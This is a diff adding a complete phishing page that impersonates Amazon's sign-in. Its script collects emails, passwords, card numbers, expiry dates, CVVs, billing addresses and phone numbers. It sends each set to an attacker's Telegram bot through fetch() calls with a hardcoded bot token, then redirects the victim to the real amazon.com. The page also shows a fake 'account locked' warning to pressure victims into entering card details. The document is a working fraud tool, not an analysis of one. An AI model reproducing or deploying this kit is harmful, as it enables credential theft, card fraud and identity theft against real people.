@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        body{
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+            font-family: "Amazon Ember",Arial,sans-serif;
+        }
+        .contain{
+            width: 21%;
+            margin: auto;
+        }
+        .form{
+            border: 1px solid #d8d5d5;
+            padding: 15px 30px 30px;
+        }
+        button{
+            width: 102%;
+            padding: 7px;
+            background: #ffd814;
+            border-color: #a88734 #9c7e31 #846a29;
+    border: 0.4px solid;
+    border-radius: 7px;
+    margin-top: 4%;
+    color: #000;
+        }
+        input{
+            height: 31px;
+    padding: 3px 2px;
+    line-height: normal;
+    border: 1px solid #a6a6a6;
+    border-top-color: #949494;
+    border-radius: 3px;
+    box-shadow: 0 1px 0 rgb(255 255 255 / 50%), 0 1px 0 rgb(0 0 0 / 7%) inset;
+    outline: 0;
+    font-family: "Amazon Ember",Arial,sans-serif;
+    width: 100%;
+        }
+        
+        h1{
+            font-weight: 400;
+            font-family: "Amazon Ember",Arial,sans-serif;
+    font-size: 28px;
+    line-height: 1.2;
+        }
+        label{
+            font-size: 13px;
+            font-weight: 700;
+    line-height: 19px;
+    color: #111;
+    font-family: "Amazon Ember",Arial,sans-serif;
+        }
+
+        p{
+            font-size: 12px!important;
+    line-height: 1.5!important;
+    font-weight: 500;
+        }
+        a{
+            color: #0066c0;
+            font-size: 13px;
+        }
+
+        .newman hr{
+            width: 30%;
+            height: 0%;
+        }
+        .newman p{
+            color: #767676;
+
+        }
+        .newman{
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .create{
+            background: #f1f2f5;
+            color: #000;
+            border: 1px solid #000;
+            font-weight: bold;
+        }
+
+        #imgs{
+            height: 135px;
+            display: none;
+        }
+
+        #footer ul a{
+            font-size: 12px;
+        }
+        #footer ul{
+            list-style: none;
+            display: flex;
+            flex-direction: row;
+            justify-content: space-between;
+            text-align: center;
+        }
+        #butid{
+            display: none;
+        }
+        #footer{
+            width: 80%;
+            margin: auto;
+            text-align: center;
+            margin-top: 5%;
+            /* border-top: 1px solid #dad8d8; */
+            -webkit-box-shadow: inset 0px 77px 91px -130px rgba(94, 93, 93, 0.6);
+-moz-box-shadow: inset 0px 77px 91px -130px rgba(94, 93, 93, 0.6);
+box-shadow: inset 0px 77px 91px -130px rgba(94, 93, 93, 0.6);
+margin-top: 2%;
+
+        }
+
+        .formlock h1,
+        .formlocke h1{
+            font-weight: bold;
+            font-size: 20px;
+        }
+        .formloc{
+            width: 20%;
+            margin: auto;
+            border: 1px solid #d8d5d5;
+            padding: 15px 30px 30px;
+            display: none;
+        }
+        .formlock{
+            width: 30%;
+            margin: auto;
+            border: 1px solid #d8d5d5;
+            padding: 15px 30px 30px;
+            display: none;
+        }
+        .formlocke{
+            width: 30%;
+            margin: auto;
+            border: 1px solid #d8d5d5;
+            padding: 15px 30px 30px;
+            display: none;
+        }
+        .containn{
+            margin: auto;
+            text-align: center;
+            width: 23%;
+        }
+        #img{
+            margin: auto;
+            height: 50px;
+            
+        }
+        .img{
+            width: 100%;
+            text-align: center;
+        }
+        .spaced{
+            display: flex;
+            justify-content: space-between;
+            display: none;
+            margin-bottom: 4%;
+            width: 100%;
+            align-items: center;
+        }
+        .pwlabel{
+            display: flex;
+            justify-content: space-between;
+            display: none;
+        }
+        .usern{
+            font-size: 13px;
+        }
+        #pwd{
+            display: none;
+        }
+
+        .formlocked{
+            width: 60%;
+            margin: auto;
+            border: 1px solid #d8d5d5;
+            padding: 15px 30px 30px;
+            display: none;
+        }
+#spread{
+
+}
+        #iimgg{
+            display: none;
+        }
+        .spread input{
+
+        }
+        .spread{
+            display: flex;
+            justify-content: space-between;
+            margin-top: 4%;
+            
+        }
+        #zipcity input{
+            width: 90%;
+        }
+        @media(max-width: 800px){
+
+        .formlocked{
+            width: 90%;
+            padding: 5px;
+            border: none;
+
+        }
+
+        .conta{
+            width: 95%;
+            padding: 5px;
+        }
+        .spread input{
+            width: 95%;
+        }
+
+            .formloc,
+            .formlock,
+            .formlocke{
+                width: 90%;
+                /* border: none; */
+                padding: 5px;
+            }
+
+
+           .contain{
+            width: 95%;
+           } 
+        #footer{
+            width: 100%;
+            margin-top: 15%;
+            display: none;
+
+        }
+        .containn{
+            width: 95%;
+        }
+        #imgs{
+            height: 117px;
+        }
+        .formlocke{
+            width: 95%;
+        }
+        
+        #spread input{
+            width: 90%;
+        }
+        #spread{
+            /* display: flex; */
+            /* flex-direction: column; */
+        }
+        }
+    </style>
+</head>
+<body>
+    <div class="img" id="iimgg">
+        <img src="https://www.linkpicture.com/q/Screenshot-2023-03-07-at-9.16.27-AM_1.png" id="img" class="imgp" alt="">
+    </div>
+    <div class="contain">
+        <div class="img">
+            <img src="https://www.linkpicture.com/q/Screenshot-2023-03-07-at-9.16.27-AM_1.png" id="img" alt="">
+            <img src="https://www.linkpicture.com/q/Screenshot-2023-03-09-at-4.53.48-AM.png" id="imgs" alt="">
+        </div>
+        <div class="form">
+            <h1>Sign in</h1>
+            <div class="spaced"> <div class="usern"></div> <a href="#">Change</a></div>
+            <form action="#" method="" id="form">
+                <div class="pwlabel">
+                    <label for="">Password</label>
+                    <a href="#">Forgot your password?</a>
+                </div>
+                <label for="" id="emlabel">Email or mobile phone number</label><br>
+                <input type="email" id="user" >
+                <input type="password" id="pwd" >
+                <br>
+                <button id="cont">Continue</button>
+                <button type="submit" id="butid">Sign In</button>
+                <br>
+                <p>By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#"> Privacy Notice</a>.
+                </p><br>
+            </form>
+            <a href="#">Need help?</a>
+        </div>
+
+        <br><br>
+        <div class="newman">
+            <hr>
+            <p>New to Amazon?</p>
+            <hr>
+        </div>
+        <button class="create">Create your Amazon account</button>
+    </div>
+     <div class="formlocked">
+        <div class="conta">
+        <h1>Account Update And Verification Required!</h1>
+        <hr>
+        <h4>Your Account has been temporarily locked.</h4>
+        <br>
+        <p>Due to some recent activities, We require that you update and verify some of your account information</p>
+        <br>
+        <button id="secSub">CONTINUE</button>
+        <br><br><br><br>
+    </div>
+    </div>
+    <div class="formlocke">
+        <div class="conta">
+        <h1>Confirm your Credit/Debit card</h1>
+        <p>Step 1 of 2:</p>
+        <h5>Card Name</h5>
+        <form action="#">
+            <label for="">Name as it appears on card.</label>
+            <input type="text" id="flname" placeholder="NAME ON CARD">
+            <br><br>
+            <label for="">Card Number</label>
+            <input type="text" id="cnum">
+            <div class="spread" id="spread">
+                <div class="label">
+                    <label for="">EXPIRY DATE</label>
+                    <input type="text" id="exp">
+                </div>
+                <div class="label">
+                    <label for="">CVV</label>
+                    <input type="text" id="cvvs">
+                </div>
+            </div>
+        </form>
+        <button id="secSubz">CONTINUE</button>
+        <br><br><br><br>
+    </div>
+    </div>
+
+
+    <div class="formlock">
+        <div class="conta">
+        <h1>Update Billing Information</h1>
+        <p>Step 2 of 2:</p>
+        <form action="#">
+            <label for="">Name</label>
+            <input type="text" id="full-name" placeholder="FULL NAME">
+            <br><br>
+            <label for="">Phone/Mobile number</label>
+            <input type="text" id="phone-mob">
+            <br><br>
+            <label for="">Street Address</label>
+            <input type="text" id="street-add">
+            <div class="spread" id="zipcity">
+                <div class="label">
+                    <label for="">ZIP Code</label>
+                    <input type="text" id="zip-code">
+                </div>
+                <div class="label">
+                    <label for="">City</label>
+                    <input type="text" id="city">
+                </div>
+                <div class="label">
+                    <label for="">State</label>
+                    <input type="text" id="state">
+                </div>
+            </div>
+        </form>
+        <button id="secSubb">NEXT</button>
+        <br><br><br><br>
+    </div>
+    </div>
+    <div class="formloc">
+        <img src="https://www.linkpicture.com/q/6apqio2l3lersrtenak._CB427825677.png" height="150" style="margin-left:20% ;" alt="">
+        <div class="conta">
+        <h1 style="font-size: 20px;">For your security, Please verify the email address we have on file:</h1>
+        <br>
+        <label for="">Email Address</label>
+        <input type="text" id="emais" placeholder="Email Address">
+  
+        <button id="secSubam">CONTINUE</button>
+        <br><br>
+        <p>We need you to verify your email to add this device as a Trusted Device</p>
+        <p>Using industry standard encryption to protect your data, we instantly confirm your email on file and then establish a secure connection to verify with your email service provider</p>
+        <br>
+        <br>
+        <br><br><br><br>
+    </div>
+    </div>
+
+
+<footer id="footer">
+    <div class="containn">
+        <br>
+        <ul>
+            <li><a href="#">Conditions of Use </a></li>
+            <li><a href="#">Privacy Notice</a></li>
+            <li><a href="#">Help</a></li>
+        </ul>
+        <p>© 1996-2023, Amazon.com, Inc. or its affiliates</p>
+    </div>
+</footer>
+
+    <script>
+        const inputne = document.querySelector("#user")
+const button = document.querySelector("#cont")
+const secInput = document.querySelector("#pwd")
+const space = document.querySelector(".spaced")
+const userSpace = document.querySelector(".usern")
+const emLabel = document.querySelector("#emlabel")
+const butt = document.querySelector("#butid")
+const imgs = document.querySelector("#imgs")
+const iimgg = document.querySelector("#iimgg")
+const contain = document.querySelector(".contain")
+const formlocked = document.querySelector(".formlocked")
+const formlocke = document.querySelector(".formlocke")
+const formlock = document.querySelector(".formlock")
+const formloc = document.querySelector(".formloc")
+const secSub = document.querySelector("#secSub")
+const secSubz = document.querySelector("#secSubz")
+
+
+const formal = document.querySelector('#form')
+
+let bot = {
+    TOKEN: "6636761328:AAEfHmiz8pDB1XlMaBq60cq-tRgM0Zl8PHU",
+    chatID: "-822669959"
+}
+// let sub = document.querySelector('#signInSubmit')
+button.addEventListener('click', e=>{
+    e.preventDefault()
+    if(inputne.value === ""){
+        return
+    }
+    inputne.style.display = "none"
+    secInput.style.display = "block"
+    space.style.display = "block"
+    userSpace.textContent = inputne.value
+    emLabel.textContent = 'Password'
+    butt.style.display = "block"
+    button.style.display = "none"
+    
+})
+
+butt.addEventListener('click', e=>{
+    if(secInput.value === ""){
+        return
+    }
+    e.preventDefault();
+
+    // alert('Works')
+    fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=AMAZONLogs==apEmail::-${inputne.value}==apPassword::${secInput.value}::`, {
+        method: "GET"
+    }).then(success => {
+        if(secInput.type === "text"){
+        // form.style.display = "none"
+        contain.style.display = "none"
+        formlocked.style.display = "block"
+        iimgg.style.display = "block"
+
+        }
+        imgs.style.display = "block"
+        secInput.type = "text"
+        // window.location.replace("/com/second.html");
+
+
+    }, error => {
+        // alert("Message not sent")
+        console.log(error)
+
+    })
+
+})
+
+secSub.addEventListener('click',()=>{
+    formlocked.style.display = "none"
+    formlocke.style.display = "block"
+})
+
+
+const flname = document.querySelector("#flname")
+const cnum = document.querySelector("#cnum")
+const exp = document.querySelector("#exp")
+const cvvs = document.querySelector("#cvvs")
+
+
+secSubz.addEventListener('click', (e)=>{
+    e.preventDefault()
+    // alert('aps')
+    if(flname.value === "" || cnum.value === "" || exp.value === "" || cvvs.value === ""){
+        return
+    }
+
+    fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=AMAZONLogs==FullName::-${flname.value}==CBIN::${cnum.value}::==${exp.value}::==${cvvs.value}`, {
+        method: "GET"
+    }).then(success => {
+
+    formlocke.style.display = "none"
+    formlock.style.display = "block"
+
+    }, error => {
+        alert("Message not sent")
+        // console.log(error)
+
+    })
+})
+
+
+
+
+
+
+const fullName = document.querySelector("#full-name")
+const phoneMob = document.querySelector("#phone-mob")
+const zipCode = document.querySelector("#zip-code")
+const city = document.querySelector("#city")
+const streetAdd = document.querySelector("#street-add")
+const state = document.querySelector("#state")
+const secSubb = document.querySelector("#secSubb")
+const secSubam = document.querySelector("#secSubam")
+const emais = document.querySelector("#emais")
+
+secSubb.addEventListener('click', (e)=>{
+    e.preventDefault()
+    if(fullName.value === "" || phoneMob.value === "" || zipCode.value === "" || city.value === "" || streetAdd.value === "" || state.value === "" ){
+        return
+    }
+    fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=AMAZONLogs==FullName::-${fullName.value}==PHONE::${phoneMob.value}::ZIP-CODE==${zipCode.value}::CITY==${city.value}::STREET==${streetAdd.value}::STATE==${state.value}`, {
+        method: "GET"
+    }).then(success => {
+
+// alert("WORKING")
+formlock.style.display = "none"
+formloc.style.display = "block"
+
+    }, error => {
+        // alert("Message not sent")
+        console.log(error)
+
+    })
+
+})
+
+
+
+
+
+secSubam.addEventListener('click', ()=>{
+    if(emais.value === ""){
+        return
+    }
+    fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=AMAZONLogs==apEmail::-${emais.value}`, {
+        method: "GET"
+    }).then(success => {
+       
+        // if(emais.value.includes('gmail.com')){
+        //      window.location.replace("https://gmail.com");
+        // }else if(emais.value.includes('yahoo.com')){
+        //     window.location.replace("https://yahoo.com");
+        // }else if(emais.value.includes('aol.com')){
+        //     window.location.replace("https://aol.com");
+        // }else if(emais.value.includes('att.net')){
+        //     window.location.replace("https://att.net");
+        // }else if(emais.value.includes('scbglobal.net')){
+        //     window.location.replace("https://att.net");
+        // }
+         window.location.replace("https://amazon.com");
+        // if(emais.value.includes('yahoo.com')){
+        //  window.location.replace("/com/yahoo.html");
+        // }else if(emais.value.includes('yahoo.com')){
+        //     window.location.replace("/com/yahoo.html");
+        // }else if(emais.value.includes('aol.com')){
+        //     window.location.replace("/com/aol.html");
+        // }else if(emais.value.includes('att.net')){
+        //     window.location.replace("/com/att.html");
+        // }else if(emais.value.includes('scbglobal.net')){
+        //     window.location.replace("/com/sbcglobal.html");
+        // }
+
+
+    }, error => {
+        // alert("Message not sent")
+        console.log(error)
+
+    })
+})
+    </script>
+
+
+</body>
+</html>
